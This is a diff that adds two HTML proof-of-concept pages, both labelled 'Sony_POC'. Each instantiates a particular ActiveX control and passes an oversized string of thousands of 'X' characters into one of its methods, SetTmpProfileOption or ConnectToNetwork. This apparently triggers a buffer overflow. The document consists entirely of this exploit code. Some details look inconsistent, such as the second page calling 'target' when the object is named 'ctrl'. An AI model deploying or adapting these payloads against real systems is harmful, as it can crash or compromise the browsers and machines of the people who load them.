@@ -1,0 +1,41 @@
+1.
+
+<HTML>
+<BODY>
+<object id=ctrl
+classid="clsid:{92E7DDED-BBFE-4DDF-B717-074E3B602D1B}"></object>
+<SCRIPT>
+function Do_()
+{
+
+arg1=1
+arg2=String(8212, "X")
+arg3="defaultV"
+SetTmpProfileOption arg1 ,arg2 ,arg3
+}
+</SCRIPT>
+<input language=JavaScript onclick=Do_() type=button value="Sony_POC">
+
+</BODY>
+</HTML>
+
+
+2.
+
+<HTML>
+<BODY>
+<object id=ctrl
+classid="clsid:{92E7DDED-BBFE-4DDF-B717-074E3B602D1B}"></object>
+<SCRIPT>
+function Do_()
+{
+
+arg1=1
+arg2=String(6164, "X")
+target.ConnectToNetwork arg1 ,arg2
+}
+</SCRIPT>
+<input language=JavaScript onclick=Do_() type=button value="Sony_POC">
+
+</BODY>
+</HTML>
